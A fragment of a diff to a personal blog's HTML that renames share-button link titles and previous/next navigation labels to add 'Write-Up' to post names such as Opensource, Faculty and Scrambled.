+<a class="resp-sharing-button__link" href="whatsapp://send?text=Opensource%20Write-Up%20https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -970,7 +993,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;t=Opensource" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;t=Opensource%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -978,7 +1001,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Opensource&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Opensource%20Write-Up&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -1001,7 +1024,7 @@
             <span class="button previous">
                 <a href="https://mostxeon.github.io/posts/faculty/">
                     <span class="button__icon">←</span>
-                    <span class="button__text">Faculty</span>
+                    <span class="button__text">Faculty Write-Up</span>
                 </a>
             </span>
             
@@ -1009,7 +1032,7 @@
             
             <span class="button next">
                 <a href="https://mostxeon.github.io/posts/scrambled/">
-                    <span class="button__text">Scrambled</span>
+                    <span class="button__text">Scrambled Write-Up</span>
                     <span class="button__icon">→</span>
                 </a>
             </span>
